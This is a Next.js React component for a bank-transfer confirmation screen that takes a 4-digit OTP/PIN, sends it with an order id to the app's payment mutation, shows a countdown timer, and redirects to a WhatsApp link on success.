'use client';

import Image from 'next/image';
import React, { useState, useEffect } from 'react';
import OtpInput from '@/components/OtpInput';
import { usePayMutation } from '@/hooks/use-pay.mutation';
import { useSearchParams } from 'next/navigation';

interface TransferConfirmationProps {
  bankLogo: string;
  className?: string;
  amount: string;
  accountNumber: string;
  bankCode?: string; 
  accountName: string;
  bankName: string;
  countdownSeconds?: number;
  onConfirm?: () => void;
  onCancel?: () => void;
  type: string;
}

const TransferConfirmation: React.FC<TransferConfirmationProps> = ({
  bankLogo,
  className = '',
  amount,
  accountNumber,
  accountName,
  bankName,
  countdownSeconds = 120,
  onConfirm,
  onCancel,
  type = '',
}) => {
  const [timeLeft, setTimeLeft] = useState<number>(countdownSeconds);
  const [isExpired, setIsExpired] = useState<boolean>(false);
  const [isConfirmed, setIsConfirmed] = useState<boolean>(false);
  const [otp, setOtp] = useState<string>('');
  const { isSuccess, isPending, mutate, data } = usePayMutation();
  const searchParams = useSearchParams();

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = (): void => {
    // if (otp.length === 4) {
    //   setIsConfirmed(true);
    //   onConfirm?.();
    // }
    mutate({
      oid: searchParams.get('oid') as string,
      pin: otp,
      type: type,
    });
  };

  const handleCancel = (): void => {
    onCancel?.();
  };

  const handleOtpComplete = (value: string): void => {
    setOtp(value);
  };

  useEffect(() => {
    if (data?.success) {
      window.location.href = 'https://wa.me/2349065577709';
    }
  }, [data]);

  return (
    <div
      className={`flex flex-col items-center justify-center bg-[#fdf9f6] ${className}`}
    >
      <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6">
        <div className="flex flex-col items-center mb-6">
          <div className="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mb-4">
            <Image
              src={bankLogo}
              alt={`${bankName} logo`}
              width={40}
              height={40}
              className="object-contain"
            />
          </div>

          <h2 className="text-lg font-semibold text-gray-700">Bank Transfer</h2>
          <p className="text-2xl font-bold mt-2">₦{amount}</p>

          <div className="mt-6 text-center">
            <p className="text-gray-600">To: {accountName}</p>
            <p className="text-gray-800 font-medium">
              {accountNumber} • {bankName}
            </p>
          </div>
        </div>

        <div className="mb-6">
          {!isConfirmed && !isExpired && (
            <OtpInput
              value={otp}
              onChange={(value: string) => setOtp(value)}
              numInputs={4}
              isDisabled={isExpired}
              onComplete={handleOtpComplete}
            />
          )}
        </div>

        <div className="flex flex-col space-y-3">
          {isPending && (
            <button
              disabled={isPending}
              className="py-3 px-4 rounded-lg font-medium bg-gray-200 text-gray-500"
            >
              Loading...
            </button>
          )}
          {!isPending && (
            <button
              onClick={handleConfirm}
              disabled={
                isPending || isConfirmed || isExpired || otp.length !== 4
              }
              className={`py-3 px-4 rounded-lg font-medium ${
                isConfirmed
                  ? 'bg-green-100 text-green-800'
                  : isExpired
                    ? 'bg-gray-200 text-gray-500'
                    : otp.length === 4
                      ? 'bg-blue-600 text-white hover:bg-blue-700'
                      : 'bg-gray-200 text-gray-500'
              }`}
            >
              {isConfirmed
                ? 'Transfer Completed'
                : isExpired
                  ? 'Session Expired'
                  : otp.length === 4
                    ? 'Confirm Transfer'
                    : 'Enter OTP'}
            </button>
          )}

          <button
            onClick={handleCancel}
            className="py-3 px-4 rounded-lg font-medium text-red-600 border border-red-600 hover:bg-red-50"
          >
            Cancel Transaction
          </button>
        </div>

        <div className="mt-6 flex justify-between items-center text-sm text-gray-500">
          <span>⏱ {formatTime(timeLeft)}</span>
          <div className="flex items-center">
            <span>Secured by</span>
            <Image
              src="/images/laskad-logo.png"
              alt="Laskad Logo"
              width={68}
              height={68}
            />
          </div>
        </div>

        {isExpired && (
          <div className="mt-4 text-center text-red-500 text-sm">
            Session expired. Please start a new transfer.
          </div>
        )}
      </div>
    </div>
  );
};

export default TransferConfirmation;
